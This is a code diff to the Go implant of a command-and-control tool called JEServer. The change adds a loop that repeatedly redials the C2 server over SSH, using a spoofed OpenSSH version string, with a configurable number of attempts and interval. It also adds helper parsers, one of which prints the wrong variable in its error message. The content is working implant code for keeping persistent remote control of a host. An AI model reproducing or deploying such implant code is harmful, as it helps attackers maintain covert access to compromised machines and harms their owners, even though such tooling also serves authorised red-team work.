@@ -6,7 +6,7 @@ package main
  * Implant side of JEServer
  * By J. Stuart McMurray
  * Created 20220326
- * Last Modified 20220410
+ * Last Modified 20220715
  */
 
 import (
@@ -17,17 +17,21 @@ import (
 	"io"
 	"net/http"
 	"os"
+	"strconv"
 	"strings"
 	"sync"
+	"time"
 
 	"golang.org/x/crypto/ssh"
 )
 
 var (
-	ServerAddr string
-	ServerFP   string
-	PrivKey    string
-	SSHVersion = "SSH-2.0-OpenSSH_8.6"
+	ServerAddr           string
+	ServerFP             string
+	PrivKey              string
+	SSHVersion           = "SSH-2.0-OpenSSH_8.6"
+	ReconnectionAttempts = "12"
+	ReconnectionInterval = "5m"
 
 	/* Signer is PrivKey, parsed. */
 	Signer ssh.Signer
@@ -42,6 +46,18 @@ var (
 )
 
 func main() {
+	var (
+		nReconnTries = flag.Int(
+			"reconnection-attempts",
+			parseReconnTries(),
+			"Reconnection attempt `count`",
+		)
+		reconnInterval = flag.Duration(
+			"reconnection-interval",
+			parseReconnInterval(),
+			"Reconnection `interval`",
+		)
+	)
 	flag.StringVar(
 		&ServerAddr,
 		"address",
@@ -91,15 +107,42 @@ func main() {
 		)
 	}()
 
+	/* Connect and reconnect. */
+	var (
+		de    DialError
+		tries int
+	)
+	for {
+		tries++
+		err := connect()
+		switch {
+		case errors.As(err, &de):
+			Debugf("Error connecting to C2 server: %s", err)
+		case errors.Is(err, io.EOF), nil == err:
+			Debugf("Connection to C2 server closed")
+			tries = 0
+		default:
+			Debugf("Fatal error connecting to server: %s", err)
+			os.Exit(8)
+		}
+
+		/* If we've tried too much, give up. */
+		if 0 < *nReconnTries && *nReconnTries <= tries {
+			Debugf("Maximum reconnection tries reached")
+			os.Exit(9)
+		}
+
+		/* Sleep a bit before the next try. */
+		time.Sleep(*reconnInterval)
+	}
+}
+
+/* connect connects to the server and starts normal processing. */
+func connect() error {
 	/* Connect to the C2 server. */
 	cc, chans, reqs, err := ConnectToC2()
 	if nil != err {
-		Debugf(
-			"Error establishing connection with C2 %s: %s",
-			ServerAddr,
-			err,
-		)
-		os.Exit(7)
+		return err
 	}
 	C2ConnL.Lock()
 	C2Conn = cc
@@ -109,15 +152,7 @@ func main() {
 	go HandleC2Reqs(cc, reqs)
 
 	/* Wait for the connection to die. */
-	err = cc.Wait()
-	switch {
-	case errors.Is(err, io.EOF), nil == err:
-		Debugf("Connection to C2 server closed")
-		os.Exit(8)
-	default:
-		Debugf("Connection to C2 server closed with error: %s", err)
-		os.Exit(9)
-	}
+	return cc.Wait()
 }
 
 // ParsePrivateKey parses PrivKey, which may be base64'd, and stores it in
@@ -159,4 +194,32 @@ func ParsePrivateKey() error {
 	Signer = s
 
 	return nil
+}
+
+/* parseReconnTries parses the number of reconnection attempts we'll make.  If
+parsing fails, parseReconnTries panics. */
+func parseReconnTries() int {
+	n, err := strconv.ParseInt(ReconnectionAttempts, 0, 0)
+	if nil != err {
+		panic(fmt.Sprintf(
+			"parsing ReconnectionAttempts (%q): %s",
+			ReconnectionAttempts,
+			err,
+		))
+	}
+	return int(n)
+}
+
+/* parseReconnInteraval parses the interval at which we'll try to reconnect.
+If parsing fails, parseReconnInterval panics. */
+func parseReconnInterval() time.Duration {
+	d, err := time.ParseDuration(ReconnectionInterval)
+	if nil != err {
+		panic(fmt.Sprintf(
+			"parsing ReconnectionInterval (%q): %s",
+			ReconnectionAttempts,
+			err,
+		))
+	}
+	return d
 }
